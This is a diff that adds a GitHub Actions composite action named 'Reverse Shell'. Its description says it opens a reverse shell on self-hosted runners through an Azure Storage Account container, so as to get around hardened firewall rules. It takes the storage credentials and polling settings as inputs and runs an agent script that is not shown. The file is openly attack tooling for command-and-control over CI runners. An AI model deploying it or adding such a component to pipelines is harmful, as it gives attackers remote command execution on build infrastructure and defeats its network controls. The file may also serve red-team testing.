@@ -1,0 +1,34 @@
+name: 'Reverse Shell'
+description: 'This sends a reverse shell via Azure Storage Account to circumvent hardened firewall rules for self-hosted runners.'
+
+inputs:
+  az-storage-account-name:
+    description: 'The Azure Storage Account to send data to'
+    required: true
+  az-storage-container-name:
+    description: 'The name of the Azure Storage Account container to send data to'
+    required: true
+  az-storage-sas-token:
+    description: 'The SAS token for the Azure Storage Account container'
+    required: true
+  retry-interval:
+    description: 'How often the action pulls for new commands in the storage account in seconds'
+    required: false
+    default: 2
+  max-retries:
+    description: 'How many times the action will check for new commands in the storage account before terminating the reverse shell'
+    required: false
+    default: 60
+
+runs:
+  using: "composite"
+  steps:
+    - name: 'Setup reverse shell via Azure Storage Account container'
+      shell: bash
+      run: bash ${{ github.action_path }}/agent.sh
+      env:
+        AZ_STORAGE_ACCOUNT_NAME: ${{ inputs.az-storage-account-name }}
+        AZ_STORAGE_CONTAINER_NAME: ${{ inputs.az-storage-container-name }}
+        AZ_STORAGE_SAS_TOKEN: ${{ inputs.az-storage-sas-token }}
+        RETRY_INTERVAL: ${{ inputs.retry-interval }}
+        MAX_RETRIES: ${{ inputs.max-retries }}
